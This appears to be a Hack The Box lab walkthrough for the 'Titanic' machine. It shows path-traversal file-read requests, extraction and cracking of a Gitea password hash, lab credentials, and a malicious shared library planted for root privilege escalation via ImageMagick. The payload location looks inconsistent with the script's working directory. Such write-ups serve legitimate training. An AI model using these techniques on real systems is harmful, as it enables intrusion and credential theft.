
# Titanic – HTB Walkthrough

## 🧭 Enumeration
We begin by scanning all ports on the host:

```bash
nmap -sS -p- 10.10.11.55 -T5
```

Output:
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

Port 80 is hosting a web application, and port 22 is running an SSH service.

## 🔍 Port 80 – Web Discovery
```bash
nmap -sV -p 80 10.10.11.55 -T5
```

Output:
```bash
80/tcp open  http Apache httpd 2.4.52
```

After adding `titanic.htb` to `/etc/hosts`, browsing the site reveals a ship booking platform.  
Submitting the booking form triggers the download of a JSON file from:

```
/download?ticket=<uuid>.json
```

## 🧪 Local File Inclusion (LFI)
Modifying the `ticket` parameter confirms the presence of LFI:

```bash
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
```

We're also able to retrieve:

```bash
curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
```

→ ✅ User flag obtained.

## 🔍 dev.titanic.htb – Gitea Discovery
Exploring the subdomain `dev.titanic.htb` reveals a Gitea instance. Inside the `docker-config` repository:

```yaml
services:
  mysql:
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
```

We also find the Gitea data volume path:
```
/home/developer/gitea/data/gitea/gitea.db
```

Using the LFI vulnerability:
```bash
curl -s "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

Open the file using `sqlite3` and extract the developer's credentials.

## 🔐 Cracking Developer Credentials
Convert the hash into hashcat format (mode 10900) and run:

```bash
hashcat -m 10900 hash.txt rockyou.txt
```

Result:
```
developer:25282528
```

→ ✅ SSH access gained.

## 🧑‍💻 SSH Access as developer
```bash
ssh developer@titanic.htb
```

Once inside, we find a suspicious script at `/opt/scripts/identify_images.sh`:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find . -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

## 🧨 Privilege Escalation via ImageMagick

The installed version of ImageMagick (`7.1.1-35`) is vulnerable to RCE.  
We can exploit this by planting a malicious shared object named `libxcb.so.1`:

```c
gcc -x c -shared -fPIC -o libxcb.so.1 - << EOF
#include <stdlib.h>
__attribute__((constructor)) void init() {
    system("cp /root/root.txt /tmp/root.txt;");
}
EOF
```

Drop it into the script’s working directory:

```bash
mv libxcb.so.1 /opt/scripts/
```

When the script is executed, it will load our forged shared object.

As a result, we get the root flag in `/tmp`:

```bash
cat /tmp/root.txt
```

→ ✅ Root flag obtained.

## 🏁 Summary

| Step          | Description                                                 |
|---------------|-------------------------------------------------------------|
| nmap          | Enumerated open ports (22, 80)                              |
| LFI           | Exploited `/download?ticket=` to read local files           |
| Gitea         | Found dev.titanic.htb and retrieved Gitea database          |
| DB Dump       | Extracted and cracked developer password from `gitea.db`   |
| SSH           | Gained shell access as developer                            |
| ImageMagick   | Dropped malicious `libxcb.so.1` to escalate privileges      |
| Root          | Read root flag via the triggered payload                    |

🎉 Rooted!
